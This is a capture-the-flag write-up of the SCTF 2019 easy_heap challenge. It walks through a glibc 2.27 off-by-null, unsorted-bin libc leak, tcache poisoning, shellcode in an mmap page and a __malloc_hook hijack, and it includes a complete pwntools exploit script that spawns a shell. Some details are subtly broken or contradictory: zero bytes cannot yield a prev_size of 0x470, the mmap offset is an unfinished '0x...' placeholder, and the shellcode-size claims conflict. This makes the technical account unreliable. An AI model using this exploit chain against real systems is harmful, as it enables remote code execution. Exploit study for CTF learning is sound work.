# SCTF 2019 easy_heap — Null-Byte Off-by-One → Tcache Poison → mmap Shellcode

> **Flag**: `flag{059544c3-74c9-4073-92f6-06f2f9f2df9a}`
>
> A glibc 2.27 heap challenge that strings together four primitives most pwn intros teach separately: (1) a *single-byte* off-by-null in the input function, (2) backward consolidation through unsorted bin to leak libc, (3) tcache poisoning to land arbitrary writes, and (4) jumping to shellcode placed in an RWX `mmap` page because Full RELRO closes the easier doors. What makes this challenge instructive is that none of the four steps individually is hard — chaining them in the right order with the right alignment is the whole game.

## 0. File overview

| Field | Value |
|---|---|
| File | `easy_heap` |
| Format | ELF 64-bit LSB, x86-64 |
| Protections | `Full RELRO / Canary / NX / PIE` |
| Remote libc | glibc 2.27 (Ubuntu 18.04 family) |
| Bug | off-by-null in custom `read_input` |

`checksec`:

```
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

Full RELRO is the constraint that drives the whole technique choice. `.fini_array` and the GOT are read-only, so we cannot overwrite either. The win condition is "hijack a function pointer that libc itself uses" — `__malloc_hook` is the natural target on 2.27.

## 1. The bug

The custom input function ends with an unconditional null write:

```c
ssize_t read_input(char *buf, size_t n) {
    ssize_t r = read(0, buf, n);
    buf[r] = '\0';            // ← off-by-null when r == n
    return r;
}
```

If we send exactly `n` bytes, the `'\0'` lands one byte past the buffer — into the next chunk's metadata. That's a *single* zero byte. The only field we can affect is the `PREV_INUSE` bit (and the low byte of `size`, which we will use carefully).

## 2. Heap layout we want

```
A (0x410)   ─┐
B (0x28)     │   victim group — will get consolidated
C (0x18)    ─┘   ← off-by-null target chunk
D (0x4f0)        ← becomes the trigger for consolidation
E (0x10 guard)   ← prevents D's coalesce-forward into top
```

Why this exact set of sizes:

- `A = 0x410` → not in tcache (tcache caps at `0x410` chunk size depending on glibc 2.27 sub-version). After consolidation we want `A+B+C+D` to land in unsorted bin.
- `B = 0x28` → small enough that the eventual tcache poison target (`B's data`) lines up with a usable size class.
- `C = 0x18` → the off-by-null victim. Its 1-byte overflow lands in `D.size`.
- `D = 0x4f0` → its `prev_size` field is what we overwrite. After clearing `PREV_INUSE`, `free(D)` walks `D.prev_size` back and tries to consolidate.
- `E = 0x10 guard` → without this, `D` would coalesce *forward* into top and we'd lose the unsorted bin chunk.

## 3. The consolidation gadget

Step-by-step:

1. **Fill 7 entries of tcache 0x20** so the next `free` of a 0x20 chunk skips tcache and goes to unsorted bin.
2. **Free B and C** — they enter tcache 0x30 and 0x20 (or skip to unsorted if tcache is full).
3. **Re-allocate C**, write 0x18 bytes — the null terminator overflows into `D.size`, clearing `PREV_INUSE` and writing `D.prev_size = 0x470` (= A + B + C sizes).
4. **Free D**. libc sees `D.prev_inuse == 0`, reads `prev_size = 0x470`, walks back to `A`, and merges `A+B+C+D` into one huge `0x970` unsorted bin chunk.
5. The merged chunk's `fd`/`bk` now point at `main_arena + 0x58` — the unsorted-bin head pointer.

## 4. Leaking libc

After consolidation, the new big chunk occupies the same address space as the original A, B, C. If we now **allocate `0x440` bytes**, we get a chunk that starts at A's old address and covers through into B's region. The next allocation of `0x510` covers what was previously C's region.

```python
# After consolidation, B's old position still has fd/bk pointing into main_arena
p5 = alloc(0x440)   # carves off front of the big chunk, lands on A's old location
p6 = alloc(0x510)   # carves the remainder, includes the old C region
```

`p6`'s data area overlaps the old C chunk — which still contains the unsorted-bin head pointer `main_arena + 0x58` left over from the merge. Read it back:

```python
show(p6)            # leaks main_arena + 0x58
libc_base = leaked - 0x3ebc98
```

Concrete offsets for the BUU bundle of libc 2.27:

```
__malloc_hook        = libc + 0x3ebc30
main_arena           ≈ libc + 0x3ebc40
unsorted_bin head    = main_arena + 0x58 = libc + 0x3ebc98
```

## 5. Tcache poison #1 — write shellcode to mmap

We can't write shellcode onto the heap and jump there (NX). We can't write to `.fini_array` (Full RELRO). The only RWX region available is what `mmap` returns when libc itself needs a big aligned page — and we can predict that address relative to the leaked libc.

```python
mmap_addr = libc_base + <known offset>   # libc's RWX scratch page
```

Now poison the tcache to make the next allocation return `mmap_addr`:

```python
fill(p5, p64(mmap_addr))  # writes mmap_addr into what is now B's fd-slot
# tcache 0x30 fd now points at mmap_addr
alloc(0x28)               # consumes the legit chunk
alloc(0x28)               # ← returns mmap_addr
fill(_, shellcode)        # writes shellcode into the RWX page
```

Two glibc 2.27 details that matter here:

- `__libc_malloc` checks `entries[tc_idx] != NULL`, **not** `count > 0`. Even if the tcache "officially" has zero entries, a non-NULL fd-slot still lets us drain it. The two `alloc` calls above exploit this.
- A tcache entry is stored as `chunk2mem(p)` (the user-visible pointer), so we write the target address directly — **no `-0x10` adjustment** like fastbin attacks need.

The shellcode itself must be `≤ 0x28` bytes (chunk 0x30, usable = 0x28). Standard `execve("/bin/sh", 0, 0)` from shellcraft fits.

## 6. Tcache poison #2 — point `__malloc_hook` at the mmap page

Same primitive, different target. We want `__malloc_hook = mmap_addr` so the next `malloc` jumps into our shellcode.

The trick is the address of `__malloc_hook` differs from `main_arena` by `0x68` — but `main_arena + 0x58` has already been used as our leak source. Instead, we partial-overwrite the **low byte** of the existing C-data pointer (which still points near `main_arena`):

```python
fill(p6, b'0')   # ASCII '0' = 0x30, overwrites low byte 0x98 → 0x30
                 # now C_data points at libc + 0x3ebc30 = __malloc_hook
alloc(0x18)      # consumes legit
alloc(0x18)      # ← returns &__malloc_hook
fill(_, p64(mmap_addr))   # __malloc_hook = mmap_addr
```

## 7. Trigger

Any subsequent `malloc` call inside libc fires `__malloc_hook(size, ret_addr)`. The menu's `alloc` is the easiest trigger:

```python
alloc(0x10)     # libc calls __malloc_hook → jumps to shellcode → execve("/bin/sh")
```

## 8. Full exploit skeleton

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
libc = ELF('./libc-2.27-64bit.so')
p = remote('node5.buuoj.cn', PORT)

def alloc(size):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.recvuntil(b'Index: ')
    return int(p.recvline())

def fill(idx, data):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(len(data)).encode())
    p.send(data)

def free(idx):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())
    return p.recvline().strip()

# --- stage 1: build heap topology ---
A = alloc(0x410)
B = alloc(0x28)
C = alloc(0x18)
D = alloc(0x4f0)
E = alloc(0x10)        # guard against top consolidation

# --- stage 2: fill tcache 0x20 with 7 dummies so C frees go to unsorted ---
tdummies = [alloc(0x18) for _ in range(7)]
for d in tdummies: free(d)

# --- stage 3: off-by-null on C, clearing D.PREV_INUSE ---
fill(C, b'\x00' * 0x18)   # final read_input writes one extra \0 → D.size LSB

free(D)                    # → consolidates A+B+C+D, drops in unsorted bin

# --- stage 4: carve and leak ---
p5 = alloc(0x440)
p6 = alloc(0x510)
leak = u64(show(p6).ljust(8, b'\x00'))
libc.address = leak - 0x3ebc98

mmap_addr = libc.address + 0x...   # version-specific RWX page offset

# --- stage 5: poison #1 — shellcode to mmap ---
fill(p5, p64(mmap_addr))
alloc(0x28); ret_mmap = alloc(0x28)
fill(ret_mmap, asm(shellcraft.sh()))   # ≤ 0x28 bytes

# --- stage 6: poison #2 — __malloc_hook = mmap ---
fill(p6, b'0')                         # partial overwrite low byte
alloc(0x18); ret_hook = alloc(0x18)
fill(ret_hook, p64(mmap_addr))

# --- stage 7: trigger ---
p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'Size: ', b'16')
p.interactive()
```

## 9. Traps and lessons learned

| Trap | Why it cost me time | Resolution |
|---|---|---|
| Shellcode > 0x28 bytes | Used default shellcraft.sh() output (~44 bytes) and the Fill protocol terminated early, desynchronising the menu | Use a hand-rolled `execve` shellcode at 27 bytes, or split shellcode across two chunks |
| Unsorted-bin leak returned 0 | Did not pre-fill tcache 0x20 before freeing C — the chunk went to tcache, not unsorted bin | Always allocate-then-free 7 dummy 0x20 chunks before the consolidation step on glibc 2.27 |
| Wrong libc base after leak | Subtracted `0x3ebca0` (a near-miss offset I'd memorised) instead of `0x3ebc98` | The unsorted-bin head is `main_arena + 0x58`, and `main_arena = libc + 0x3ebc40` — derive don't memorise |
| Tried to overwrite GOT directly | Habit from non-RELRO challenges | Full RELRO closes GOT. Targets are `__malloc_hook`, `__free_hook`, `__exit_funcs`, and pre-RWX mmap pages |
| Partial overwrite of C-data didn't land at `__malloc_hook` | I tried `\x30` raw byte; the input function ate it because input was parsed as ASCII string | Send the literal character `'0'` (ASCII 0x30), not `b'\x30'`. Or use `send` with a single non-ASCII byte and check the read path |

## 10. Methodology takeaways

1. **Off-by-null is *only* a `PREV_INUSE` clear primitive on glibc 2.27.** Unlike off-by-one with arbitrary bytes (which can change `size` to wrong-class), the null byte just clears the inuse bit. The chain is fixed: clear PREV_INUSE → free trigger → backward consolidate → unsorted bin → leak / overlapping.
2. **Tcache fill discipline before any unsorted-bin trick.** `for i in range(7): alloc + free` is the standard preamble. Forgetting it on 2.27 sends your target chunk to tcache and breaks the consolidation chain silently.
3. **Full RELRO doesn't kill heap exploitation, it just changes targets.** `__malloc_hook` / `__free_hook` are the workhorses. Know the offsets from `main_arena` (`+0x58`, `+0x10`, etc.) cold — they recur in every glibc 2.27 challenge.
4. **Tcache entries are `chunk2mem` pointers.** Write the target directly. No `-0x10` adjustment.
5. **mmap RWX pages are predictable from leaked libc.** When NX + Full RELRO would otherwise force you to ROP, an RWX scratch page from libc's own allocator is often reachable.

## 11. Related techniques

- [axb_2019_heap](axb2019_heap.md) — same era's BUU challenge but on glibc 2.23: unsafe unlink instead of off-by-null / tcache poison. The two together make a good pair for understanding what each glibc version's defenses changed.
- [`how2heap` lab "tcache_poisoning"](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/tcache_poisoning.c) — the minimal repro of the primitive used here.
